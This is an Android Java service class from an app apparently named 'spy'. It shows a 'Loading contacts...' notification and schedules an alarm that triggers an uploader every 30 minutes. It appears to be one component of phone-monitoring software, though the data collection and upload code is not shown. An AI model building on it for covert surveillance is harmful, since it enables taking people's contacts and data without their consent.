package com.gameofcoding.spy.services;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import com.gameofcoding.spy.R;
import com.gameofcoding.spy.receivers.UploaderAlarm;
import com.gameofcoding.spy.utils.NotificationUtils;
import com.gameofcoding.spy.utils.XLog;

public class SnopperService extends Service {
    private static final String TAG = "SnopperService";
    private static final int UPLOADER_ALARM_ID = 10002;
    private static final int SNOPPER_SERVICE_NOTIF_ID = 1;
    private Context mContext;

    @Override
    public IBinder onBind(Intent intent) {return null;}

    @Override
    public void onCreate() {
	super.onCreate();
	XLog.v(TAG, "SnopperService has been started, preparing for loading data.");
	mContext = getApplicationContext();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
	// XXX: Only for debugging
	updateForegroundNotif("Loading contacts...");
	synchronized(this){try{wait(5000);}catch(Exception e) {throw new RuntimeException(e);}}
	updateForegroundNotif("Finishing");

	// Start alarm that repeats after 30 mins. for uploading changes
	AlarmManager alarmManager = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
	PendingIntent pendingIntent = PendingIntent
	    .getBroadcast(mContext, UPLOADER_ALARM_ID, new Intent(mContext, UploaderAlarm.class), 0);
        alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(),
				  1800_000, pendingIntent);

	// Stop service
	stopForeground(true);
	stopSelf();
        return START_STICKY;
    }


    @SuppressWarnings("deprecation")
    public void updateForegroundNotif(String contentText) {
	Notification.Builder notifBuilder = null;
	if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
	    NotificationUtils notifUtils = new NotificationUtils(mContext);
	    notifUtils.createDefaultNotifChannel();
	    String channelID = notifUtils.getDefaultNotifChannelId();
	    notifBuilder = new Notification.Builder(mContext, channelID);
	} else {
	    notifBuilder = new Notification.Builder(mContext);
	}

	// Start foreground notification
	notifBuilder.setSmallIcon(R.mipmap.ic_launcher)
	    .setContentTitle(getString(R.string.snopperservice_notif_content_title))
	    .setContentText(contentText);
	startForeground(SNOPPER_SERVICE_NOTIF_ID, notifBuilder.build());
    }
}
